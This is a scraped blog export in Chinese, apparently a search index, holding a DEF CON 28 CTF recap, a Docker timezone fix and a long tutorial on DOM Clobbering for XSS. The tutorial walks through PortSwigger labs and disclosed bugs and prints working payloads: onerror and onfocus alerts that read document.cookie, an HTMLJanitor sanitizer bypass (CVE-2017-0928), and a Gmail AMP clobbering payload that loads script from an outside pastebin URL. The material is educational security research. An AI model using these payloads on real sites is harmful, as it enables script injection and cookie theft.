后面看了出题人相关的讲述，讲述视频地址：nooode DEF CON 28 CTF Challenge w/ Guest kaptain | CTF Radiooo 003 ，后来觉得吧，确实也还过得去，这个题目增加了一些多元化的设计，因为引入了很多 lib ，所以有很多姿势可以去尝试，可以去挖，比赛途中那次重置应该也就是加强了 checker ，也看得出 OOO 在这方面还是尽力了。（如果你删掉题目给的 node_modules ，然后重新 install 的话，会发现官方给的多出一个 vm2 ，当时我们就在想难不成还可能是 vm2 逃逸？但是后面找了一会没找到就放弃了这条路。（（因为我们当时想万一 OOO 还别有用心地再放一个后门在 node_modules 呢？毕竟 Backdooor CTF 这次虽然简单，但是确实也让我增加了一些对于如何设计 AWD Web 题目的思考，包括 @Zach Wade 也有类似的想法: ​ Although I might sound frustrated by this, I think it’s actually an example of really good A/D problem design. Even though the application was straightforward, it presented a variety of options for exploitation. Something Else还有一些比较有意思的事就是，A0E 的同学说，我们队的大师傅手绕 A0E 如果再多打一轮，那么这次的结果就不一样了，也因为这个保证了与 PPP 高出的两分的差距。（这难道不值得一顿饭吗？ 根据一些现有的报道，以及向一些 A0E 的同学考证一些问题，比如他们真的是很早就准备了吗？真的有对每个人分特性，每个人擅长什么吗等等问题，都得到了肯定的回答，不得不佩服 A0E 的团队管理协作能力 orz 而且根据他们结束当天的合照来看估计也得有50多人左右吧。（据说 Samurai 参赛人数达到了恐怖的150人 虽然 PPP 表示自己 “Since DEF CON CTF is such an important competition for us, we traditionally spend the month leading up to it in preparation and organization. This year, we did not.” ，但是也展示出了一如既往对 DEFCON 的统治力。 自己在比赛的时候由于自身能力较差以及第一次跟大师傅们配合，当时比赛配合得不是相当的好，可能导致了一些失分，如果以后还有机会，希望自己提升能力的同时，也能尽量提高一些合作的能力。 总的来说，泡面、外卖很好吃，公司办公椅很舒服，“网管”运维选手非常给力，大师傅们都非常非常的厉害。今年对一开始的 KOH 以及最后的 Web 做了一点点微小的贡献，如果以后有机会的话希望能做到更大的贡献叭！ 再次恭喜 A*0*E 拿到 DEFCON 28 CTF Final 冠军！ Others NotesPPP – Zach Wade 的回顾： Kernel Panic: A DEF CON 2020 Retrospective r3kapig – Y1ng 的回顾：DEFCON 28 CTF Final Safe Mode参赛记录","link":"/2020/10/15/Defcon28final/"},{"title":"Docker镜像的时间问题","text":"今天刚刚开始做PA0，发现自己对Docker的研究也不是很深，也就是在赛宁的那段日子，算是一个契机吧，让我们用Docker搭比赛环境，那个时候开始接触的Docker，然后也跟Rex请教了有关Docker的一些知识。还以为算是比较了解Docker了吧，今天发现自己还是菜的呀。 首先今天吧，把Debian镜像给弄好了，然后装上了oh my zsh，然后发现一个\b显示时间比较方便的主题，我的Mac是agnoster的主题，还是比较好看的。但是用久了也想在docker上换换\b新的来用用。也通过这次课正式\b地研究一下Docker吧。 于是在用ys这个主题的时候，发现时间是不对的。这个又不是服务器\b，所以我觉得还是有问题的，保持着\b研究问题的\b态度看了一下。 Docker Debian里用date命令看一下 123# zedd @ c7c452f36fc4 in ~ [16:24:36]$ dateSat Jan 27 16:25:00 UTC 2018 然后查了一下，很快就找到了原来是时区的问题。我的Mac上date是 12zedd@ZedddeMac / date2018年 1月28日 星期日 00时43分52秒 CST 哈，只要改改时区应该就可以了。不过网上给的答案好像都比较麻烦，我Google到的第一条\b，修改Dockerfile个人认为是一个在创建的时候用的，还有其他的方法可能\b部分\b人看不懂，而且格式不太一样。\b我感觉应该还是有直接修改时区的\b办法的，毕竟在GUI下还是可以修改时区时间的。 下面给出\b直接的解决方案（操作\b在Debian 9下）:直接用 1dpkg-reconfigure tzdata 若\bcommand not found，可以 12cd /usr/sbinsudo ./dpkg-reconfigure tzdata 然后选择相应的时区与时间，这里我选择了 126. Asia69. Shanghai 再用date一看，哈，好了 123# zedd @ c7c452f36fc4 in /usr/sbin [0:55:52]$ dateSun Jan 28 00:56:14 CST 2018 顺便说一下，ys\b主题上的时间是你上次\b操作结束的时间。（主题用起来还是不错的，值得推荐。 最后再科普一波 12345678910111213141516171819202122232425世界协调时间UTC 多数的两地时间表都以GMT来表示，但也有些两地时间表上看不到GMT字样，出现的反而是UTC这3个英文字母，究竟何谓UTC？事实上，UTC指的是Coordinated Universal Time－ 世界协调时间（又称世界标准时间、世界统一时间），是经过平均太阳时(以格林威治时间GMT为准)、地轴运动修正后的新时标以及以「秒」为单位的国际原子时所综合精算而成的时间，计算过程相当严谨精密，因此若以「世界标准时间」的角度来说，UTC比GMT来得更加精准。其误差值必须保持在0.9秒以内，若大于0.9秒则由位于巴黎的国际地球自转事务中央局发布闰秒，使UTC与地球自转周期一致。所以基本上UTC的本质强调的是比GMT更为精确的世界时间标准，不过对于现行表款来说，GMT与UTC的功能与精确度是没有差别的。夏日节约时间DST 所谓「夏日节约时间」Daylight Saving Time（简称D.S.T.），是指在夏天太阳升起的比较早时，将时钟拨快一小时，以提早日光的使用，在英国则称为夏令时间(Summer Time)。这个构想于1784年由美国班杰明·富兰克林提出来，1915年德国成为第一个正式实施夏令日光节约时间的国家，以削减灯光照明和耗电开支。自此以后，全球以欧洲和北美为主的约70个国家都引用这个做法。目前被划分成两个时区的印度也正在商讨是否全国该统一实行夏令日光节约时间。欧洲手机上也有很多GSM系统的基地台，除了会传送当地时间外也包括夏令日光节约时间，做为手机的时间标准，使用者可以自行决定要开启或关闭。值得注意的是，某些国家有实施「夏日节约时间」的制度，出国时别忘了跟随当地习惯在表上调整一下，这可是机械表没有的功能设计哦！CST时间CST却同时可以代表如下 4 个不同的时区：Central Standard Time (USA) UT-6:00Central Standard Time (Australia) UT+9:30China Standard Time UT+8:00Cuba Standard Time UT-4:00可见，CST可以同时表示美国，澳大利亚，中国，古巴四个国家的标准时间。---------------------------------部分来自CSDN博客，转载请标明出处：http://www.51testing.com/html/74/248074-209865.html","link":"/2018/01/28/Docker%E9%95%9C%E5%83%8F%E7%9A%84%E6%97%B6%E9%97%B4%E9%97%AE%E9%A2%98/"},{"title":"使用 Dom Clobbering 扩展 XSS","text":"前几天 PortSwigger 发布了 Top 10 web hacking techniques of 2019，榜上的攻击技术都比较有意思，p牛也肯定会在小密圈做分享的（如果没有话本菜也会在自己博客做做学习分享），所以我们这里就不聊 Top 10 技术了，就看看在 Top 10 提名结果没上榜但是依旧很有意思的技术 Dom Clobbering。 文章首发于先知社区：https://xz.aliyun.com/t/7329 BasicsFrom MDN Web Docs: ​ The Document Object Model (DOM) is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. The DOM represents the document as nodes and objects. That way, programming languages can connect to the page. A Web page is a document. This document can be either displayed in the browser window or as the HTML source. But it is the same document in both cases. The Document Object Model (DOM) represents that same document so it can be manipulated. The DOM is an object-oriented representation of the web page, which can be modified with a scripting language such as JavaScript. The W3C DOM and WHATWG DOM standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using them on the web where documents may be accessed by various browsers with different DOMs. DOM 最初是在没有任何标准化的情况下诞生和实现的，这导致了许多特殊的行为，但是为了保持兼容性，很多浏览器仍然支持异常的 DOM 。 DOM 的旧版本（即DOM Level 0 &amp; 1）仅提供了有限的通过 JavaScript 引用元素的方式，一些经常使用的元素具有专用的集合（例如document.forms），而其他元素可以通过Window和Document对象上的name属性和id属性来引用， 显然，支持这些引用方式会引起混淆，即使较新的规范试图解决此问题，但是为了向后兼容，大多数行为都不能轻易更改。并且，浏览器之间没有共识，因此每个浏览器可能遵循不同的规范（甚至根本没有标准）。显然，缺乏标准化意味着确保DOM的安全是一项重大挑战。 由于非标准化的 DOM 行为，浏览器有时可能会向各种 DOM 元素添加 name &amp; id 属性，作为对文档或全局对象的属性引用，但是，这会导致覆盖掉 document原有的属性或全局变量，或者劫持一些变量的内容，而且不同的浏览器还有不同的解析方式，所以本文的内容如果没有特别标注，均默认在 Chrome 80.0.3987.116 版本上进行。 Dom Clobbering 就是一种将 HTML 代码注入页面中以操纵 DOM 并最终更改页面上 JavaScript 行为的技术。 在无法直接 XSS 的情况下，我们就可以往 DOM Clobbering 这方向考虑了。 Simple Example其实 Dom Clobbering 比较简单，我们看几个简单的例子就能知道它是干什么了的。 Exmaple 1 - Create 从图中我们可以看到通过 id 或者 name 属性，我们可以在document或者window对象下创建一个对象。 Example 2 - Overwrite 可以看到document.cookie已经被我们用 img 标签给覆盖了 Example 3 - Overwrite2 可以看到我们通过多层覆盖掉了document.body.appendChild方法。 Attack Method既然我们可以通过这种方式去创建或者覆盖 document 或者 window 对象的某些值，但是看起来我们举的例子只是利用标签创建或者覆盖最终得到的也是标签，是一个HTMLElment对象。 但是对于大多数情况来说，我们可能更需要将其转换为一个可控的字符串类型，以便我们进行操作。 toString所以我们可以通过以下代码来进行 fuzz 得到可以通过toString方法将其转换成字符串类型的标签： 1234Object.getOwnPropertyNames(window).filter(p =&gt; p.match(/Element$/)).map(p =&gt; window[p]).filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString) 我们可以得到两种标签对象：HTMLAreaElement (&lt;area&gt;)&amp; HTMLAnchorElement (&lt;a&gt;)，这两个标签对象我们都可以利用href属性来进行字符串转换。 HTMLCollection但是如果我们需要的是x.y这种形式呢？两层结构我们应该怎么办呢？我们可以尝试上述的办法： 123456&lt;div id=x&gt; &lt;a id=y href='1:hasaki'&gt;&lt;/a&gt;&lt;/div&gt;&lt;script&gt; alert(x.y);&lt;/script&gt; 这里无论第一个标签怎么组合，得到的结果都只是undefined。但是我们可以通过另一种方法加入引入 name 属性就会有其他的效果。 HTMLCollection是一个element的“集合”类，在最新的 Dom 标准中 IDL 描述如下： [Exposed=Window, LegacyUnenumerableNamedProperties]interface HTMLCollection { readonly attribute unsigned long length; getter Element? item(unsigned long index); getter Element? namedItem(DOMString name);}; 文中也提到了 ​ HTMLCollection is a historical artifact we cannot rid the web of. While developers are of course welcome to keep using it, new API standard designers ought not to use it (use sequence in IDL instead). 它是一种历史产物，并且在今天我们也可以继续使用这个类，只是对于 API 标准设计者不推荐再使用。 关于它的用法： collection . length ​ Returns the number of elements in the collection. element = collection . item(index) element = collection[index] ​ Returns the element with index index from the collection. The elements are sorted in tree order. element = collection . namedItem(name) element = collection[name] ​ Returns the first element with ID or name name from the collection. 让我们值得注意的是我们可以通过collection[name]的形式来调用其中的元素，所以我们似乎可以通过先构建一个HTMLCollection，再通过collection[name]的形式来调用。 123&lt;div id=\"x\"&gt; &lt;a id=\"x\" name=y href=\"1:hasaki\"&gt;&lt;/a&gt;&lt;/div&gt; HTML Relationships再者，我们也可以通过利用 HTML 标签之间存在的关系来构建层级关系。 1234567891011121314var log=[];var html = [\"a\",\"abbr\",\"acronym\",\"address\",\"applet\",\"area\",\"article\",\"aside\",\"audio\",\"b\",\"base\",\"basefont\",\"bdi\",\"bdo\",\"bgsound\",\"big\",\"blink\",\"blockquote\",\"body\",\"br\",\"button\",\"canvas\",\"caption\",\"center\",\"cite\",\"code\",\"col\",\"colgroup\",\"command\",\"content\",\"data\",\"datalist\",\"dd\",\"del\",\"details\",\"dfn\",\"dialog\",\"dir\",\"div\",\"dl\",\"dt\",\"element\",\"em\",\"embed\",\"fieldset\",\"figcaption\",\"figure\",\"font\",\"footer\",\"form\",\"frame\",\"frameset\",\"h1\",\"head\",\"header\",\"hgroup\",\"hr\",\"html\",\"i\",\"iframe\",\"image\",\"img\",\"input\",\"ins\",\"isindex\",\"kbd\",\"keygen\",\"label\",\"legend\",\"li\",\"link\",\"listing\",\"main\",\"map\",\"mark\",\"marquee\",\"menu\",\"menuitem\",\"meta\",\"meter\",\"multicol\",\"nav\",\"nextid\",\"nobr\",\"noembed\",\"noframes\",\"noscript\",\"object\",\"ol\",\"optgroup\",\"option\",\"output\",\"p\",\"param\",\"picture\",\"plaintext\",\"pre\",\"progress\",\"q\",\"rb\",\"rp\",\"rt\",\"rtc\",\"ruby\",\"s\",\"samp\",\"script\",\"section\",\"select\",\"shadow\",\"slot\",\"small\",\"source\",\"spacer\",\"span\",\"strike\",\"strong\",\"style\",\"sub\",\"summary\",\"sup\",\"svg\",\"table\",\"tbody\",\"td\",\"template\",\"textarea\",\"tfoot\",\"th\",\"thead\",\"time\",\"title\",\"tr\",\"track\",\"tt\",\"u\",\"ul\",\"var\",\"video\",\"wbr\",\"xmp\"], logs = [];div=document.createElement('div');for(var i=0;i&lt;html.length;i++) { for(var j=0;j&lt;html.length;j++) { div.innerHTML='&lt;'+html[i]+' id=element1&gt;'+'&lt;'+html[j]+' id=element2&gt;'; document.body.appendChild(div); if(window.element1 &amp;&amp; element1.element2){ log.push(html[i]+','+html[j]); } document.body.removeChild(div); }}console.log(log.join('\\n')); 以上代码测试了现在 HTML5 基本上所有的标签，使用两层的层级关系进行 fuzz ，注意这里只使用了id，并没有使用name，遇上文的HTMLCollection并不是一种方法。 我们可以得到的是以下关系： 123456789form-&gt;buttonform-&gt;fieldsetform-&gt;imageform-&gt;imgform-&gt;inputform-&gt;objectform-&gt;outputform-&gt;selectform-&gt;textarea 如果我们想要构建x.y的形式，我们可以这么构建： 1234&lt;form id=x&gt;&lt;output id=y&gt;I've been clobbered&lt;/output&gt;&lt;script&gt;alert(x.y.value);&lt;/script&gt; Three Level三级的层级关系我们就需要用到以上两种技巧来构建了 12345&lt;form id=\"x\" name=\"y\"&gt;&lt;output id=z&gt;I've been clobbered&lt;/output&gt;&lt;/form&gt;&lt;form id=\"x\"&gt;&lt;/form&gt;&lt;script&gt; alert(x.y.z.value);&lt;/script&gt; 这个也比较简单，先用一个HTMLCollection获取第二级，再在第一个表单中用output标签即可。 More三层层级以上的我们就需要用到iframe与srcdoc来进行配合 123&lt;iframe name=a srcdoc=\"&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;\"&gt;&lt;/iframe&gt;&lt;script&gt;setTimeout(()=&gt;alert(a.b.c.d),500)&lt;/script&gt; 因为需要等待所有的iframe加载完毕我们才能获得这个层级关系，所以需要用到延时，不用延时也可以通过网络请求来进行延缓： 123456&lt;iframe name=a srcdoc=\"&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;\"&gt;&lt;/iframe&gt;&lt;style&gt;@import 'http://example.com';&lt;/style&gt;&lt;script&gt;alert(a.b.c.d)&lt;/script&gt; Custom以上我们都是通过 id 或者 name 来利用，那我们能不能通过自定义属性来构造呢？ 1234&lt;form id=x y=123&gt;&lt;/form&gt;&lt;script&gt;alert(x.y)//undefined&lt;/script&gt; 很明显，这意味着任何未定义的属性都不会具有 DOM 属性，所以就返回了 undefined 我们可以尝试一下 fuzz 所有标签的有没有字符串类型的属性可供我们使用： 12345678910111213var html = [...]//HTML elements arrayvar props=[];for(i=0;i&lt;html.length;i++){ obj = document.createElement(html[i]); for(prop in obj) { if(typeof obj[prop] === 'string') { try { props.push(html[i]+':'+prop); }catch(e){} } }}console.log([...new Set(props)].join('\\n')); 我们可以得到一系列标签字符串类型的属性，例如: 12a:usernamea:password 但是这仅仅得到的只是知道它们属性为字符串类型，我们需要知道能不能利用，于是我们需要加上一些东西来进行验证 12345678910111213141516var html = [...]//HTML elements arrayvar props=[];for(i=0;i&lt;html.length;i++){ obj = document.createElement(html[i]); for(prop in obj) { if(typeof obj[prop] === 'string') { try { DOM.innerHTML = '&lt;'+html[i]+' id=x '+prop+'=1&gt;'; if(document.getElementById('x')[prop] == 1) { props.push(html[i]+':'+prop); } }catch(e){} } }}console.log([...new Set(props)].join('\\n')); 我们可以得到一系列的标签以及其属性名称，例如我们可以利用其中的a:title来进行组合 1234&lt;a id=x title='hasaki'&gt;&lt;/a&gt;&lt;script&gt; console.log(x.title);//hasaki&lt;/script&gt; 其中在我们第一步得到的属性中比较有意思的是 a 标签的username跟password属性，虽然我们不能直接通过title这种形式利用，但是我们可以通过href的形式来进行利用： 12345&lt;a id=x href=\"ftp:Clobbered-username:Clobbered-Password@a\"&gt;&lt;script&gt;alert(x.username)//Clobbered-usernamealert(x.password)//Clobbered-password&lt;/script&gt; Exploit ExamplePostWigger 提供了两个实验环境 https://portswigger.net/web-security/dom-based/dom-clobbering， Lab: Exploiting DOM clobbering to enable XSS ​ This lab contains a DOM-clobbering vulnerability. The comment functionality allows “safe” HTML. To solve this lab, construct an HTML injection that clobbers a variable and uses XSS to call the alert() function. 这个实验我们可以在resources/js/loadCommentsWithDomPurify.js路由找到这个 JS 文件，在displayComments()函数中我们又可以发现 12345let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}let avatarImgHTML = '&lt;img class=\"avatar\" src=\"' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '\"&gt;';let divImgContainer = document.createElement(\"div\");divImgContainer.innerHTML = avatarImgHTML 这里很明显我们可以用 Dom Clobbering 来控制 window.defaultAvatar，只要我们原来没有头像就可以用一个构造一个defaultAvatar.avatar进行 XSS 了。 根据前面的知识，这是一个两层的层级关系，我们可以用 HTMLCollection 来操作 1&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=\"1:&amp;quot;onerror=alert(1)//\"&gt; 这里注意\"需要进行 HTML实体编码，用 URL 编码的话浏览器会报错1:%22onerror=alert(1)// net::ERR_FILE_NOT_FOUND。 这样评论以后我们可以在自己的评论处看到： 1&lt;p&gt;&lt;a id=\"defaultAvatar\"&gt;&lt;/a&gt;&lt;a href=\"1:&amp;quot;onerror=alert(1)//\" name=\"avatar\" id=\"defaultAvatar\"&gt;&lt;/a&gt;&lt;/p&gt; 我们再随便评论一下就好了，就可以触发我们构造的 XSS 了。 Lab:Clobbering DOM attributes to bypass HTML filters ​ This lab uses the HTMLJanitor library, which is vulnerable to DOM clobbering. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim’s browser. Note: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab. 这个题目也比较有意思，在resources/js/loadCommentsWithHtmlJanitor.js文件中，我们可以发现代码安全多了，没有明显的直接用Window.x这种代码了 1let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}}); 一开始就初始化了HTMLJanitor，只能使用初始化内的标签及其属性，对于重要的输入输出地方都使用了janitor.clean进行过滤。看起来我们没办法很简单地进行 XSS ，那我们就只能来看看resources/js/htmlJanitor.js这个过滤文件了。 123456789HTMLJanitor.prototype.clean = function(html) { const sandbox = document.implementation.createHTMLDocument(\"\"); const root = sandbox.createElement(\"div\"); root.innerHTML = html; this._sanitize(sandbox, root); return root.innerHTML;}; 首先用document.implementation.createHTMLDocument创建了一个新的 HTML 文档用作 sandbox ，然后对于 sandbox 内的元素进行_sanitize过滤。 1234HTMLJanitor.prototype._sanitize = function(document, parentNode) {truetruevar treeWalker = createTreeWalker(document, parentNode); //...} 在_sanitize函数一开始调用了createTreeWalker函数创建一个TreeWalker，这个类表示一个当前文档的子树中的所有节点及其位置。 12345678910function createTreeWalker(document, node) { return document.createTreeWalker( node, NodeFilter.SHOW_TEXT | NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_COMMENT, null, false );} 这里的node即为一开始的root，也就是我们构造的html会在传入到node参数，document即为一开始的sandbox，接着进入循环进行判断，对于文本呢绒以及注释进行处理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748if (node.nodeType === Node.TEXT_NODE) {true//如果此文本节点只是空白，并且上一个或下一个元素同级是`blockElement`，则将其删除}// 移除所有的注释if (node.nodeType === Node.COMMENT_NODE) { //...}//检查`inlineElement`中是否还有`BlockElement`var isInline = isInlineElement(node);var containsBlockElement;if (isInline) { containsBlockElement = Array.prototype.some.call( node.childNodes, isBlockElement );}//检查`BlockElement`是否嵌套var isNotTopContainer = !!parentNode.parentNode;var isNestedBlockElement = isBlockElement(parentNode) &amp;&amp; isBlockElement(node) &amp;&amp; isNotTopContainer;var nodeName = node.nodeName.toLowerCase();//获取允许使用的属性var allowedAttrs = getAllowedAttrs(this.config, nodeName, node);var isInvalid = isInline &amp;&amp; containsBlockElement;//根据白名单删除标签if ( isInvalid || shouldRejectNode(node, allowedAttrs) || (!this.config.keepNestedBlockElements &amp;&amp; isNestedBlockElement)) { // Do not keep the inner text of SCRIPT/STYLE elements. if ( !(node.nodeName === \"SCRIPT\" || node.nodeName === \"STYLE\") ) { while (node.childNodes.length &gt; 0) { parentNode.insertBefore(node.childNodes[0], node); } } parentNode.removeChild(node); this._sanitize(document, parentNode); break;} 最后看到值得我们关注的点： 12345678910111213// Sanitize attributesfor (var a = 0; a &lt; node.attributes.length; a += 1) { var attr = node.attributes[a]; if (shouldRejectAttr(attr, allowedAttrs, node)) { node.removeAttribute(attr.name); // Shift the array to continue looping. a = a - 1; }}// Sanitize childrenthis._sanitize(document, node); 在这里最终对标签的属性进行了 check ，对 node 的每个属性都进行了白名单检查 1234567891011121314151617function shouldRejectAttr(attr, allowedAttrs, node) { var attrName = attr.name.toLowerCase(); if (allowedAttrs === true) { return false; } else if (typeof allowedAttrs[attrName] === \"function\") { return !allowedAttrs[attrName](attr.value, node); } else if (typeof allowedAttrs[attrName] === \"undefined\") { return true; } else if (allowedAttrs[attrName] === false) { return true; } else if (typeof allowedAttrs[attrName] === \"string\") { return allowedAttrs[attrName] !== attr.value; } return false;} 如果发现有不在白名单的属性，会使用node.removeAttribute(attr.name);进行删除，然后对子节点进行递归_sanitize。所以有两个思路，要么绕标签过滤，要么绕节点属性过滤。 标签的获取由treeWalker.firstChild();得到，过滤由getAllowedAttrs以及shouldRejectNode两个函数进行，由于这里的过滤是进行白名单过滤，没什么办法进行绕过；属性的获取在一个for循环当中，条件是node.attributes.length，获取方式是node.attributes[a]，过滤由shouldRejectAttr方法进行。 对 Dom Clobbering 比较敏感的同学可能会注意到这里，对于 node 属性过滤时的for循环条件，直接使用了node.attributes.length，倘若我们构造的节点正好有一个attributes子节点会怎么样呢？ 1234567891011&lt;form id=x&gt; &lt;img&gt;&lt;/form&gt;&lt;script&gt; var node = document.getElementById('x'); console.log(node.attributes); for (let a = 0; a &lt; node.attributes.length; a++) { console.log(node.attributes[a]); } console.log('finished');&lt;/script&gt; 以上这段代码会输出一个NamedNodeMap对象，id='x'以及 finished 1234567891011&lt;form id=x&gt; &lt;img name=attributes&gt;&lt;/form&gt;&lt;script&gt; var node = document.getElementById('x'); console.log(node.attributes); for (let a = 0; a &lt; node.attributes.length; a++) { console.log(node.attributes[a]); } console.log('finished');&lt;/script&gt; 以上这段代码会输出&lt;img name=attributes&gt;以及 finished ，我们可以看到我们使用name=attributes成功地覆盖了原来的node.attributes，所以node.attributes.length在这里的值为undefined，并且也没有影响 JS 代码的继续运行。 所以明白了这个简单的例子，我们可以构造一个包含有name=attributes的子节点的 payload 绕过属性的 check ，这里给定的白名单标签也比较明显，我们可以通过 HTML Relationships 来构造我们的 payload 1&lt;form id=x &gt;&lt;input id=attributes&gt; 接着就是构造 XSS 了，根据题目要求，需要用户访问触发，所以我们可以利用tabindex属性，配合form的onfocus时间来 XSS 。 1&lt;form id=x tabindex=0 onfocus=alert(document.cookie)&gt;&lt;input id=attributes&gt; 把它当作评论提交 但是如果直接交给用户点击的话是不会触发的，因为评论是由 aJax 请求拿到的，直接访问的话，Dom 树是还没有评论的，得需要等待 JS 执行完成才会有评论，所以这里我们需要一个延时或者阻塞的操作。比较简单的是利用iframe进行setTimeout 1&lt;iframe src=https://your-lab-id.web-security-academy.net/post?postId=3 onload=\"setTimeout(a=&gt;this.src=this.src+'#x',500)\"&gt; 这里要注意一定要得等评论加载完毕再用#x选择form，所以这里的 500ms 需要根据自己的网络情况适当调整。 CVE-2017-0928 Bypassing sanitization using DOM clobberinghtml-janitor 也就是我们上文用到的 HTML filters，在 v2.0.2 当中，janitor 在循环中有这么几行代码： 123456789101112do { // Ignore nodes that have already been sanitized if (node._sanitized) { continue; } //... // Sanitize children this._sanitize(node); // Mark node as sanitized so it's ignored in future runs node._sanitized = true;} while ((node = treeWalker.nextSibling())); 用_sanitized作为标志位来标志是否已经进行标准化，但是这里，由我们上个例子可以得出，我们可以利用与上个例子类似的 payload 绕过第一个 if 就可以绕过标准化过滤了。 1&lt;form&gt;&lt;object onmouseover=alert(document.domain) name=_sanitized&gt;&lt;/object&gt;&lt;/form&gt; 修复方案是删除了这些判断，对子树利用递归形式进行标准化过滤。 XSS in GMail’s AMP4Email via DOM Clobbering终于到了我们开头提到的 OWASP Top 10 提名的攻击实例了，作者首先通过直接在控制台输入 window 进行 fuzz 这里他首先利用了AMP，尝试插入&lt;a id=AMP&gt;，但是这个AMP被 ban 了 接着找到下一个AMP_MODE，这个没有被 ban ，反而让作者发现了这里加载失败的 URL 当中有一个undefined 这就是作者插入了&lt;a id=AMP_MODE&gt;导致产生的undefined，主要产生这个问题的代码经作者简化后是这样的： 1234567891011121314151617181920var script = window.document.createElement(\"script\");script.async = false; var loc;if (AMP_MODE.test &amp;&amp; window.testLocation) { loc = window.testLocation} else { loc = window.location;} if (AMP_MODE.localDev) { loc = loc.protocol + \"//\" + loc.host + \"/dist\"} else { loc = \"https://cdn.ampproject.org\";} var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\";b.src = loc + \"/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + singlePass + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); 代码比较简单，如果再要简化到核心代码就是： 12345678910var script = window.document.createElement(\"script\");script.async = false; b.src = window.testLocation.protocol + \"//\" + window.testLocation.host + \"/dist/rtv/\" + AMP_MODE.rtvVersion; + \"/\" + (AMP_MODE.singlePassType ? AMP_MODE.singlePassType + \"/\" : \"\") + \"v0/\" + pluginName + \".js\"; document.head.appendChild(b); 所以我们可以用 Dom Clobbering 来让它加载我们任意的 js 文件，直接劫持protocol到我们任意 URL，再利用#注释掉后面的即可。 123456789&lt;!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy--&gt;&lt;a id=\"AMP_MODE\"&gt;&lt;/a&gt;&lt;a id=\"AMP_MODE\" name=\"localDev\"&gt;&lt;/a&gt;&lt;a id=\"AMP_MODE\" name=\"test\"&gt;&lt;/a&gt; &lt;!-- window.testLocation.protocol is a base for the URL --&gt;&lt;a id=\"testLocation\"&gt;&lt;/a&gt;&lt;a id=\"testLocation\" name=\"protocol\" href=\"https://pastebin.com/raw/0tn8z0rG#\"&gt;&lt;/a&gt; 虽然 URL 构造出来了，但是 Google 还有 CSP 12345Content-Security-Policy: default-src 'none';script-src 'sha512-oQwIl...==' https://cdn.ampproject.org/rtv/ https://cdn.ampproject.org/v0.js https://cdn.ampproject.org/v0/ 虽然他当时没绕过，但是 Google 还是全额地给了他奖金。 另外这个 CSP 可以利用..%252f的 trick 进行绕过，由于不属于这篇文章的范围，这里就不详述了，感兴趣的同学可自行搜索。 这里由于篇幅关系，就不再列举更多的例子了，我会把最近自己做的一些 XSS Game 中涉及到 Dom Clobbering 的部分以 Tip 的形式写出来。 Thinking既然我们一开始提到过或许可以覆盖某些属性，那么我们可不可以覆盖或者说完全控制document.cookie呢？究竟我们可以覆盖哪些呢？又可以怎么利用呢？哪些可以用 ID 哪些用 Name呢？ 接下来我们来看最后一个问题：哪些用 id 哪些用 name ？ Document &amp; Id123456789101112var html = [...];//HTML elements arrayvar log = [];var div = document.createElement(\"div\");for (var i = 0; i &lt; html.length; i++) { div.innerHTML = \"&lt;\" + html[i] + \" id=x &gt;\"; document.body.appendChild(div); if (document.x == document.getElementById('x') &amp;&amp; document.x != undefined) { log.push(html[i]); } document.body.removeChild(div);}console.log(log); 我们可以得到只有object标签document可以通过 id 进行直接获取 1[\"object\"] Document &amp; Name1document.x == document.getElementsByName(\"x\")[0] &amp;&amp; document.x != undefined 我们可以得到以下五个元素可以让document通过 name 进行直接获取 1&nbsp;[\"embed\", \"form\", \"image\", \"img\", \"object\"] Document &amp; Name &amp; Id1234567891011121314var html = [...];//HTML elements arrayvar log = [];var div = document.createElement(\"div\");for (var i = 0; i &lt; html.length; i++) { div.innerHTML = \"&lt;\" + html[i] + \" id=x name=y &gt;\"; document.body.appendChild(div); if ( document.x == document.getElementsByName(\"y\")[0] &amp;&amp; document.x != undefined ) { log.push(html[i]); } document.body.removeChild(div);}console.log(log); 我们可以得到一下三个元素： 1[\"image\", \"img\", \"object\"] Window &amp; Id123456789101112var html = [...];//HTML elements arrayvar log = [];var div = document.createElement(\"div\");for (var i = 0; i &lt; html.length; i++) { div.innerHTML = \"&lt;\" + html[i] + \" id=x &gt;\"; document.body.appendChild(div); if (window.x == document.getElementById('x') &amp;&amp; window.x != undefined) { log.push(html[i]); } document.body.removeChild(div);}console.log(log); 除了在 [Not Clobbered](#Not Clobbered) 部分的标签，其他标签window均可通过 id 进行直接获取 1(128) [\"a\", \"abbr\", \"acronym\", \"address\", \"applet\", \"area\", \"article\", \"aside\", \"audio\", \"b\", \"base\", \"basefont\", \"bdi\", \"bdo\", \"bgsound\", \"big\", \"blink\", \"blockquote\", \"br\", \"button\", \"canvas\", \"center\", \"cite\", \"code\", \"command\", \"content\", \"data\", \"datalist\", \"dd\", \"del\", \"details\", \"dfn\", \"dialog\", \"dir\", \"div\", \"dl\", \"dt\", \"element\", \"em\", \"embed\", \"fieldset\", \"figcaption\", \"figure\", \"font\", \"footer\", \"form\", \"h1\", \"header\", \"hgroup\", \"hr\", \"i\", \"iframe\", \"iframes\", \"image\", \"img\", \"input\", \"ins\", \"isindex\", \"kbd\", \"keygen\", \"label\", \"legend\", \"li\", \"link\", \"listing\", \"main\", \"map\", \"mark\", \"marquee\", \"menu\", \"menuitem\", \"meta\", \"meter\", \"multicol\", \"nav\", \"nextid\", 